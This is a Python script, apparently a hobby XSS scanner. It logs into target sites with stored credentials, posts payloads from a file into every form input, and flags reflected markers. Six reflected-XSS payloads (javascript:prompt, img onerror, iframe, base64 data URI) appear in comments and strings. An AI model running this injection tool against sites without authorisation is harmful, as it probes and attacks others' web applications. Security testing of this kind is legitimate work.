# -*- coding: utf-8 -*-
"""
Created on Mon Oct 14 19:57:33 2019

@author: Wang
"""
import os
import sys
import re
import requests

from html.parser import HTMLParser
import urllib.request
from urllib.parse import urlparse
from bs4 import BeautifulSoup

fp = open("XSS.txt","w", encoding = "utf-8")
fp.close()

def check_xss(soup1):
    #print("hhhhh", type(soup1))
    
    #"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">YOU/HAVE/XSS1</a>
    tag_a = soup1.find_all('a') 
    for out in tag_a:
        #print(out.string)
        if (out.string == "YOU/HAVE/XSS1"):
            return(1)
            
    #"><a href=javascript:prompt(1)>YOU/HAVE/XSS2</a>
    tag_a = soup1.find_all('a')
    for out in tag_a:
        #print(out.string)
        if (out.string == "YOU/HAVE/XSS2"):
            return(2)
    
    #"><h1 onclick=prompt(1)>YOU/HAVE/XSS3</h1>
    tag_a = soup1.find_all('h1')
    for out in tag_a:
        #print(out.string)
        if (out.string == "YOU/HAVE/XSS3"):
            return(3)
            
    #"><img src=YOU/HAVE/XSS4 onerror=prompt(1)>       
    tag_a = soup1.find_all('img')
    for out in tag_a:
        #print(out['src'])
        if (str(out['src']) == "YOU/HAVE/XSS4"):
            return(4)
    
    #"><iframe src= YOU/HAVE/XSS5>       
    tag_a = soup1.find_all('iframe')
    for out in tag_a:
        #print(out['src'])
        if (str(out['src']) == "YOU/HAVE/XSS5"):
            return(5)
            
    #"><a href="xss">YOU/HAVE/XSS6</a>
    tag_a = soup1.find_all('a') 
    for out in tag_a:
        #print(out.string)
        if (out.string == "YOU/HAVE/XSS6"):
            return(6)
            
    #os.system("pause")
    
def Xss_result(result:int,url,Positon):
    #print(Positon)
    #print(result)
    patern1 = " \"><a href=\"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\">YOU/HAVE/XSS</a> "
    patern2 = " \"><a href=javascript:prompt(1)>YOU/HAVE/XSS</a> "
    patern3 = " \"><h1 onclick=prompt(1)>YOU/HAVE/XSS</h1> "
    patern4 = " \"><img src=YOU/HAVE/XSS onerror=prompt(1)> "
    patern5 = " \"><iframe src= YOU/HAVE/XSS> "
    patern6 = " \"><a href=\"xss\">YOU/HAVE/XSS</a> "
    FIND = "FIND A XSS INJECTION!!!!!!!!!"
    
    fp = open("XSS.txt", "a", encoding = "utf-8")
    if result == 1:
        fp.write(FIND)
        fp.write("\n")
        fp.write("injection patern = ")
        fp.write(patern1)
        fp.write("\n")
        fp.write("URL = ")
        fp.write(url)
        fp.write("\n")
        fp.write(str(Positon))
        fp.write("\n\n")

    if result == 2:
        fp.write(FIND)
        fp.write("\n")
        fp.write("injection patern = ")
        fp.write(patern2)
        fp.write("\n")
        fp.write("URL = ")
        fp.write(url)
        fp.write("\n")
        fp.write(str(Positon))
        fp.write("\n\n")

    if result == 3:
        fp.write(FIND)
        fp.write("\n")
        fp.write("injection patern = ")
        fp.write(patern3)
        fp.write("\n")
        fp.write("URL = ")
        fp.write(url)
        fp.write("\n")
        fp.write(str(Positon))
        fp.write("\n\n")

    if result == 4:
        fp.write(FIND)
        fp.write("\n")
        fp.write("injection patern = ")
        fp.write(patern4)
        fp.write("\n")
        fp.write("URL = ")
        fp.write(url)
        fp.write("\n")
        fp.write(str(Positon))
        fp.write("\n\n")

    if result == 5:
        fp.write(FIND)
        fp.write("\n")
        fp.write("injection patern = ")
        fp.write(patern5)
        fp.write("\n")
        fp.write("URL = ")
        fp.write(url)
        fp.write("\n")
        fp.write(str(Positon))
        fp.write("\n\n")
        
    if result == 6:
        fp.write(FIND)
        fp.write("\n")
        fp.write("injection patern = ")
        fp.write(patern6)
        fp.write("\n")
        fp.write("URL = ")
        fp.write(url)
        fp.write("\n")
        fp.write(str(Positon))
        fp.write("\n\n")

    fp.close()

def connetion_is_ok(testURL:str):
    print("目前檢查的 url 為:",testURL)
    response = requests.get(testURL)
    report = response.status_code
    
    #print(type(report))
    if report == 200:
        return True
    else:
        print(report)
        fp = open("XSS.txt", "a", encoding = "utf-8")
        fp.write("THIS URL NOT GOOD 404!!")
        fp.write("\n")
        fp.write(testURL)
        fp.write("\n\n")
        return False
        


fp_allURL = open("allURL.txt", "r+", encoding = "utf-8")
while True:
    testURL = fp_allURL.readline()
    testURL = testURL.strip()

    #flag1 flag2 用來辨識 此網站是不是要先處理登入才能測試
    needEmail = 0
    needLogin = 0
    #fp.close()
    if not testURL:
        fp_allURL.close()
        fp1 = open("XSS.txt", "a", encoding= "utf-8")
        fp1.write("~結束~")
        fp1.close()
        print("allURL.txt are all tested!!!! END")
        sys.exit(0)
        break

    print("目前從 allURL.txt 讀出來的 url 為:",testURL)
    
    if (connetion_is_ok(testURL)):
        #確認 URL 狀態為 200
        #e.g testURL = "https://ecourse.ncyu.edu.tw/mod/page/view.php?id=34880&forceview=1/"
        #開始做XSS

        #建立一個 Session
        same_sid = requests.Session()
        GetHtmlResponse = same_sid.get(testURL)

        #print(str(GetHtmlResponse.cookies),'\n')
        #COOKIE = GetHtmlResponse.cookies['PHPSESSID']  #保存cookie
        #print(COOKIE, '\n')
        #print("最一開始拿到的html = \n")
        #print(GetHtmlResponse.text, '\n')

        #下面是加的
        #測試到需要先登入的url
        soup = BeautifulSoup(GetHtmlResponse.text, "lxml")
        tag_input = soup.find_all('input',attrs={'name':True})
        tag_form = soup.find_all('form')
        
        for out in tag_input:
            #print(out)
            #print(out['name'])
            if str(out['name']) == "username":
                needEmail = 0

                fp = open("username.txt", "r+", encoding = "utf-8")
                usrname = fp.read()
                fp.close()
            if str(out['name']) == "password":
                needLogin = 1

                fp = open("password.txt", "r+", encoding = "utf-8")
                password = fp.read()
                fp.close()

            if str(out['name']) == "email":
                needEmail = 1

                fp = open("username.txt", "r+", encoding = "utf-8")
                usrname = fp.read()
                fp.close()
    

        if (needLogin==1):#需要先登入
            if (needEmail==1):
                data = {
                    "email" : usrname,
                    "password" : password
                }
            if (needEmail==0):
                data = {
                    "username" : usrname,
                    "password" : password
                        } 

            testURL = GetHtmlResponse.url # 原本的url因為要登入但未登入，所以被導向登入頁面的url，所以要更新url
            response = same_sid.post(testURL, data) #登入成功
            #開始解析原本要登入的url內的 input點 (如果要登入的話 這是處理完登入後，拿到新的且正確的html)
            soup = BeautifulSoup(response.text, "lxml")
            tag_input = soup.find_all('input',attrs={'name':True})
            tag_form = soup.find_all('form')

            #上面是加的
        
        #soup = BeautifulSoup(GetHtmlResponse.text, "lxml")
        #tag_input = soup.find_all('input',attrs={'name':True})
        #tag_form = soup.find_all('form')

        file = open("paterndata.txt", "r", encoding = "utf-8")
        while True:
            patern = file.readline()
            #print("CURRENT PATERN = ", patern, '\n')
            if not patern:
                print("END TO PUT ALL XSS PATERN TO THIS URL")
                file.close()
                break

            for out in tag_input:
                name = out['name'] #tag p1
                Positon = out # 紀錄腳本 e.g. "><a href="xss">YOU/HAVE/XSS6</a>
                #print(name)
                print(Positon)
                Data = {
                        name : patern
                        }
                for out in tag_form:
                    checknum = out['action']#拿到 sid值
                url = testURL + checknum
                #print(url)
                CheckmodifyHtml = same_sid.post(url, Data) #將修改過的data重新request

                print("CURRENT PATERN = ",patern)
                #print("放入腳本後要檢查變化的html = ")
                #print(CheckmodifyHtml.text)

                soup1 = BeautifulSoup(CheckmodifyHtml.text, "lxml")
                tag_form = soup1.find_all('form')
                
                ans = check_xss(soup1)
                Xss_result(ans,url,Positon)

                #print("------------------------------------")
                #print(str(out))
                #print(out['name'])

       

